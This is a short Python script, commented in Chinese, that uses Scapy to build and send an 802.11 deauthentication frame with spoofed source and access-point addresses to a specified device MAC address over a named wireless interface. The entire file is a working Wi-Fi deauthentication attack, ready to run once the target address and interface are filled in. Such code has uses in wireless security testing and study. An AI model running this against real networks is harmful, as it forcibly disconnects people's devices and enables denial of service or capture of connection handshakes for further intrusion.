from scapy.all import * 

def send_80211_packet(destination_mac, interface):
    # 创建L2Socket对象
    socket = L2Socket(iface=interface)

    # 构建要发送的封包
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=destination_mac, addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55") / Dot11Deauth(reason=7)

    try:
        # 发送封包
        socket.send(packet)
        # send(packet, iface = interface)
        print("Packet sent successfully!")
    except Exception as e:
        print("Failed to send packet:", e)

# 指定要发送封包的目标MAC地址和网络接口
destination_mac = "bc:ee:7b:e7:ab:54"  # 替换为目标设备的MAC地址
interface = "wlan2"  # 替换为您的网络接口名称

# 调用函数发送封包
send_80211_packet(destination_mac, interface)